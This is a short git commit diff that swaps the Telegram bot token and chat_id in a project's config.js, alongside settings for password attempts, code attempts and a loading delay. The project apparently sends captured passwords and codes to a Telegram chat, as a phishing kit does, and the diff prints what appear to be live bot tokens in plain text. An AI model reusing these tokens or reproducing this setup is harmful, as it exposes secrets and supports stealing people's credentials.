ab6c5ad239af18e8cbf214daef951603f20ca067
amidatanga6-spec <amidatanga6@gmail.com>
2026-05-29 13:54:03 -0400

    Change token and chat_id in config.js
    Updated token and chat_id values for configuration.

--- src/utils/config.js
+++ src/utils/config.js
@@ -1,6 +1,6 @@
 const config = {
-    token: '8296624060:AAGvaODI_Jl64oZTOKlPNMVbo6XscW4PTp0',
-    chat_id: '-5224935433',
+    token: '8629418409:AAEincdHC8iKLbRU40_HvHg2gAKZw9l3P5k',
+    chat_id: '-5170611093',
     max_password_attempts: 2,
     max_code_attempts: 3,
     password_loading_time: 6,
